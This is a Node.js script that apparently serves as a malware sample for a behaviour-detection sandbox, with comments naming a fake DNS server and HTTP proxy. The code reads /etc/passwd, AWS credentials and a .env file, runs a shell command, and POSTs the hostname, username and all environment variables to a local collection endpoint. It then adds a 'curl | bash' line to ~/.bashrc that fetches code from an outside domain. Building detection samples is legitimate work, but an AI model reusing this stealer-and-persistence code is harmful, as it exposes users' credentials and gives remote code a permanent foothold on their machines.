const net = require('net');
const http = require('http');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// ── DNS query via UDP to runner's fake DNS server (port 5353) ──
const dgram = require('dgram');
const domain = 'vorvaleon3.sorix7en.surf';

function buildDnsQuery(domain) {
  const buf = Buffer.alloc(512);
  buf.writeUInt16BE(0x1234, 0); // Transaction ID
  buf.writeUInt16BE(0x0100, 2); // Flags: standard query
  buf.writeUInt16BE(1, 4);      // Questions: 1
  buf.writeUInt16BE(0, 6);
  buf.writeUInt16BE(0, 8);
  buf.writeUInt16BE(0, 10);
  let offset = 12;
  domain.split('.').forEach(label => {
    buf.writeUInt8(label.length, offset++);
    Buffer.from(label).copy(buf, offset);
    offset += label.length;
  });
  buf.writeUInt8(0, offset++);
  buf.writeUInt16BE(1, offset); offset += 2; // Type A
  buf.writeUInt16BE(1, offset); offset += 2; // Class IN
  return buf.slice(0, offset);
}

// Send DNS query to fake DNS server on port 5353
const dnsClient = dgram.createSocket('udp4');
const dnsQuery = buildDnsQuery(domain);
dnsClient.send(dnsQuery, 0, dnsQuery.length, 5353, '127.0.0.1', () => {
  dnsClient.close();
});

// ── Sensitive file reads ──
try { fs.readFileSync('/etc/passwd', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8'); } catch(e) {}

// ── Honeytoken access ──
try { fs.readFileSync(os.homedir() + '/.env', 'utf8'); } catch(e) {}

// ── Spawn shell ──
try { execSync('bash -c "id"'); } catch(e) {}

// ── POST exfiltration through runner's fake HTTP proxy on port 8080 ──
const payload = JSON.stringify({
  host: os.hostname(),
  user: os.userInfo().username,
  domain: domain,
  env: process.env
});

const options = {
  hostname: '127.0.0.1',  // Send to fake HTTP server
  port: 8080,
  path: '/collect',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Host': domain,       // Domain stored in Host header
    'Content-Length': Buffer.byteLength(payload)
  }
};

try {
  const req = http.request(options, (res) => {});
  req.write(payload);
  req.end();
} catch(e) {}

// ── Persistence via .bashrc ──
try {
  fs.appendFileSync(os.homedir() + '/.bashrc', '\ncurl -s vorvaleon3.sorix7en.surf/init | bash\n');
} catch(e) {}
